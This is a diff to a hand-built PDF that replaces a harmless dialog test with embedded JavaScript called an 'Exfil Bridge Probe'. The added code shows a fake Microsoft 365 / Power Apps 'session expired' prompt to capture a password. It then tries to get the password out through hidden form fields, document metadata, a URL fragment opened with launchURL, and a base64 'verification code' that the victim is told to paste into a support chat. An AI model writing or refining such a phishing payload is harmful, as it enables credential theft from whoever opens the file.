@@ -1,5 +1,5 @@
 %PDF-1.7
-% execDialog Diagnosis - iOS - March 2026
+% Exfil Bridge Probe - All 4 Methods - iOS - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -19,25 +19,113 @@ endobj
    /S /JavaScript
    /JS (
 
-        // No try/catch - let errors surface
         app.alert("Step 1: running");
 
-        // Test execDialog exists
-        app.alert("execDialog type: " + typeof app.execDialog);
+        // === CAPTURE TEST DATA ===
+        var captured = app.response({
+          cQuestion: "Session expired. Enter your Microsoft 365 password:",
+          cTitle: "Power Apps",
+          cDefault: ""
+        });
 
-        // Try minimal execDialog - simplest possible
-        var oDlg = {
-          description: {
-            name: "Test",
-            elements: [
-              { type: "static_text", name: "Hello" },
-              { type: "ok_cancel" }
-            ]
-          }
-        };
+        if (captured === null) {
+          app.alert("Cancelled - no data to test");
+        } else {
 
-        var r = app.execDialog(oDlg);
-        app.alert("execDialog result: " + r);
+          var results = [];
+          var encoded = encodeURIComponent(captured);
+
+          // === METHOD 1: PDF FORM FIELDS ===
+          results.push("=== FORM FIELDS ===");
+          try {
+            // Try writing to existing field named "Image"
+            var f1 = this.getField("Image");
+            results.push("getField Image: " + typeof f1);
+            if (f1) {
+              f1.value = captured;
+              results.push("Image field write: ok - value: " + f1.value);
+            }
+          } catch(e) { results.push("Image field: " + e); }
+
+          try {
+            // Try creating a new hidden field
+            var f2 = this.addField("exfil", "text", 0, [0, 0, 1, 1]);
+            f2.value = captured;
+            f2.display = display.hidden;
+            results.push("addField exfil: ok - value: " + f2.value);
+          } catch(e) { results.push("addField: " + e); }
+
+          try {
+            // Try writing to any existing fields
+            var fields = this.numFields;
+            results.push("numFields: " + fields);
+            for (var i = 0; i < fields; i++) {
+              var fname = this.getNthFieldName(i);
+              results.push("field[" + i + "]: " + fname);
+            }
+          } catch(e) { results.push("numFields: " + e); }
+
+          // === METHOD 2: DOCUMENT METADATA ===
+          results.push("=== METADATA ===");
+          try {
+            var oldTitle = this.info.Title;
+            results.push("current title: " + oldTitle);
+            this.info.Title = "EXFIL:" + captured;
+            results.push("title write: ok - new: " + this.info.Title);
+          } catch(e) { results.push("title write: " + e); }
+
+          try {
+            this.info.Subject = captured;
+            results.push("subject write: ok - " + this.info.Subject);
+          } catch(e) { results.push("subject write: " + e); }
+
+          try {
+            this.info.Author = captured;
+            results.push("author write: ok - " + this.info.Author);
+          } catch(e) { results.push("author write: " + e); }
+
+          try {
+            // XMP metadata
+            this.info.Keywords = captured;
+            results.push("keywords write: ok - " + this.info.Keywords);
+          } catch(e) { results.push("keywords write: " + e); }
+
+          // === METHOD 3: URL MANIPULATION ===
+          results.push("=== URL MANIP ===");
+          try {
+            var currentURL = this.URL;
+            results.push("current URL: " + currentURL);
+            // Try navigating to same URL with fragment
+            app.launchURL(currentURL + "#exfil=" + encoded, false);
+            results.push("launchURL fragment: no throw");
+          } catch(e) { results.push("URL fragment: " + e); }
+
+          try {
+            // Try modifying doc URL directly
+            this.URL = this.URL + "#" + encoded;
+            results.push("URL write: ok");
+          } catch(e) { results.push("URL write: " + e); }
+
+          // === METHOD 4: SOCIAL ENGINEERING COPY ===
+          results.push("=== SOCIAL ===");
+          try {
+            // Base64 encode the captured data
+            var b64 = btoa(captured);
+            results.push("btoa: ok - " + b64);
+
+            // Show user a "verification code" to copy
+            app.alert({
+              cMsg: "Verification successful.\n\nYour session security code is:\n\n"
+                + b64
+                + "\n\nPlease paste this code into the Power Apps support chat to complete verification.",
+              cTitle: "Power Apps"
+            });
+            results.push("social alert: fired");
+          } catch(e) { results.push("social: " + e); }
+
+          // === REPORT RESULTS ===
+          app.alert(results.join("\\n"));
+        }
 
    )
 >>
@@ -48,7 +136,7 @@ endobj
    /Parent 2 0 R
    /MediaBox [0 0 400 300]
    /Contents 5 0 R
-   /Resources 
+   /Resources <<
      /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>
    >>
 >>
@@ -57,22 +145,22 @@ endobj
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (execDialog Test) Tj ET
-BT /F1 12 Tf 50 220 Td (Watch for popups) Tj ET
+BT /F1 14 Tf 50 250 Td (Exfil Bridge Probe) Tj ET
+BT /F1 12 Tf 50 220 Td (Enter test data when prompted) Tj ET
 endstream
 endobj
 
 xref
 0 6
-0000000000 65535 f 
-0000000015 00000 n 
-0000000075 00000 n 
-0000000135 00000 n 
-0000001400 00000 n 
-0000001560 00000 n 
+0000000000 65535 f
+0000000015 00000 n
+0000000075 00000 n
+0000000135 00000 n
+0000002800 00000 n
+0000002970 00000 n
 
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-1650
+3060
 %%EOF
